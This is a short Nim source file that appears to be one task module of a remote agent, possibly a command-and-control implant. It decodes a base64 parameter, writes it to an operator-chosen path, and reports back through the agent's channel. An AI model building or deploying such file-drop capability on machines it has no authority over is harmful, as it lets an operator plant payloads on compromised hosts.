import std/base64
import ../client/[communication, types]

proc executeTask*(app: App, taskId: int, params: seq[string]) =
  let taskOutput = newTaskOutput taskId

  try:
    let fileContents = decode(params[0])
    writeFile(params[1], fileContents)
    taskOutput.data = "received file " & params[1] & " (length: " & $len(fileContents) & ")"
  except:
    taskOutput.error = getCurrentExceptionMsg()

  app.sendOutput(taskOutput)